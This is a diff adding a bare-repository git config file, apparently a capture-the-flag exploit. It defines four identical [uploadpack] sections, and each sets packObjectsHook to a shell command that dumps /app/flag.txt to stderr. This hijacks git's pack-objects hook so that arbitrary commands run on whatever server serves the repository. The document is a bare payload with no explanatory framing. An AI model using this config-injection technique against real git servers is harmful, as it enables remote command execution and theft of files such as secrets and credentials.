@@ -1,0 +1,14 @@
+[core]
+	repositoryformatversion = 0
+	filemode = true
+	bare = true
+[remote "origin"]
+	url = /home/ujjwal/Desktop/a
+[uploadpack]
+    packObjectsHook = sh -c "cat /app/flag.txt >&2; exit 1"
+[uploadpack]
+    packObjectsHook = sh -c "cat /app/flag.txt >&2; exit 1"
+[uploadpack]
+    packObjectsHook = sh -c "cat /app/flag.txt >&2; exit 1"
+[uploadpack]
+    packObjectsHook = sh -c "cat /app/flag.txt >&2; exit 1"
